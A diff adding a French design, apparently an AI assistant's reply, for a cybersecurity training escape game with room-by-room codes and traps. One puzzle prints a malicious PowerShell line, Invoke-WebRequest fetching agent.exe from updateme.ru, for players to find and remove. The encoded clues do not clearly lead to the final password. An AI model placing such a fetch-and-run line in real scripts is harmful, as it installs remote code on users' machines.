@@ -1,0 +1,126 @@
+Parfait. Voici une série de codes à craquer et pièges à intégrer dans ton escape game cyber, répartis par salle, avec pour chaque élément :
+
+📍 Où il se trouve
+
+🧠 Mécanique de jeu
+
+🧩 But pédagogique
+
+🔥 Conséquence si le joueur échoue ou tombe dans un piège
+
+🔐 CODES À CRAQUER & DÉFIS LOGIQUES
+🧑‍💼 Salle RH
+🔐 Code #1 : Mot de passe caché dans un document
+📍 Document Word “Candidatures_2023.docm”
+
+🧠 L’info est dans les métadonnées du fichier (Auteur : Emma_RH_P4ssw0rd).
+
+🔍 À trouver via un bouton “Inspecter les propriétés”
+
+🎯 Apprentissage : ne jamais stocker un mot de passe en clair
+
+❌ Échec : Si on l’ouvre directement → piège déclenché → compte à rebours malware 3 minutes.
+
+🛠️ Salle IT
+🔐 Code #2 : Lecture de logs
+📍 Terminal de logs : log_ssh_conn_04.txt
+
+🧠 Le joueur doit repérer une connexion à 03:44 vers 185.191.127.43
+
+🧩 Il choisit l’IP anormale parmi 5 propositions.
+
+🎯 Apprentissage : analyse d’un comportement réseau suspect
+
+❌ Erreur : fausse IP → Lucas bloque la salle suivante pendant 2 min.
+
+🔐 Code #3 : Script PowerShell infecté
+📍 Fichier check_update.ps1
+
+🧠 Le joueur doit corriger une ligne :
+
+Mauvaise ligne : Invoke-WebRequest -Uri "http://updateme.ru/agent.exe"
+
+Bonne ligne : supprimer ou remplacer par lien interne
+
+🎯 Apprentissage : repérage d’un exécutable distant malveillant
+
+✅ Réussite : débloque la clé USB.
+
+❌ Échec : infecte virtuellement le poste de Lucas (accès perdu à son aide).
+
+🧑‍💻 Salle Support
+🔐 Code #4 : Décryptage Base64 / ROT13
+📍 Contenu de la clé USB remise par Karim
+
+🧠 Le contenu est :
+
+D’abord en ROT13 : Vafgnapr vf zl anzr
+
+Puis en base64 : SW5jaWRlbnQgaW4gY29ycmVjdCBzZWN0aW9u
+
+🎯 Apprentissage : chaînage d’encodage = méthode de masquage simple
+
+✅ Bonne combinaison : déverrouille un mot de passe réel.
+
+❌ Piège : trop d’essais → bloque la clé USB définitivement.
+
+👩‍💼 Salle Direction
+🔐 Code #5 : Arbitrage éthique
+📍 Ordre de redémarrage des systèmes :
+
+Mail / ERP / Sauvegardes
+
+🧠 Le joueur doit choisir la bonne séquence :
+
+Sauvegarde
+
+ERP
+
+Mail
+
+🎯 Apprentissage : priorisation métier / sécurité
+
+❌ Mauvais ordre : retour de ransomware → chrono final déclenché (5 minutes restantes pour finir le jeu).
+
+🕳️ Salle Chiffrée (finale)
+🔐 Code #6 : Mot de passe combiné
+📍 Terminal de récupération système
+
+🧠 Le joueur doit combiner 3 mots de passe collectés :
+
+P4ssw0rd (RH)
+
+127.43_03:44 (IP)
+
+InnocentCore (clé USB)
+
+🎯 Apprentissage : capitalisation sécurisée des indices
+
+❌ Échec = fausse combinaison → 1 seule tentative possible.
+
+💣 PIÈGES DISSÉMINÉS
+🧨 Piège #1 : Lien dans le mail d’Emma
+Clic sur “Cliquez ici pour valider votre recrutement” → active faux antivirus
+
+L’IA t’interpelle :
+
+“Ce lien ne pointe pas vers un domaine connu. Que venez-vous de déclencher ?”
+
+Chrono lancé : 3 minutes pour isoler la machine RH
+
+🧨 Piège #2 : Fichier Excel "Audit interne"
+Si ouvert sans antivirus → injecte une erreur logique
+
+Résultat : un PNJ te donne des infos fausses (ex. faux IP)
+
+Leçon à la fin :
+
+“Un document interne peut être altéré. L’absence de signature ou de vérification peut coûter cher.”
+
+🧨 Piège #3 : Faux PNJ (employé compromis)
+Dans le couloir, un “collègue” propose de t'aider à récupérer un fichier plus vite.
+
+Si tu acceptes → il active une commande malveillante
+
+Résultat : perte de 300 crédits et isolement automatique du système de backup
+
